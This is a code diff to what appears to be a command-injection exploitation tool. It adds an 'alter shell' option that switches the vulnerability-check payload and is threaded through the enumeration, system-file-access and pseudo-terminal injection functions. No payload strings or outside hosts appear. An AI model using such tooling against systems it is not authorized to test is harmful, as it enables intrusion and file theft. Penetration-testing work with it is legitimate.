@@ -135,9 +135,16 @@ def cb_injection_handler(url,delay,filename,http_request_method):
 	    B64_ENC_TAG = TAG
 	    B64_DEC_TRICK = ""
 	    
+	  # Define alter shell
+	  alter_shell = menu.options.alter_shell
+	
 	  try:
-	    # Classic decision payload (check if host is vulnerable).
-	    payload = cb_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
+	    if alter_shell:
+	      # Classic decision payload (check if host is vulnerable).
+	      payload = cb_payloads.decision_alter_shell(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
+	    else:
+	      # Classic decision payload (check if host is vulnerable).
+	      payload = cb_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
 	    
 	    # Check if defined "--prefix" option.
 	    if menu.options.prefix:
@@ -253,10 +260,10 @@ def cb_injection_handler(url,delay,filename,http_request_method):
 	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20"," ",payload) + colors.RESET
 	      
 	    # Check for any enumeration options.
-	    cb_enumeration.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+	    cb_enumeration.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
 
 	    # Check for any system file access options.
-	    cb_file_access.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+	    cb_file_access.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
 	    
 	    # Pseudo-Terminal shell
 	    while True:
@@ -272,7 +279,7 @@ def cb_injection_handler(url,delay,filename,http_request_method):
 		      
 		    else:
 		      # The main command injection exploitation.
-		      response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+		      response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
 		      
 		      # if need page reload
 		      if menu.options.url_reload:
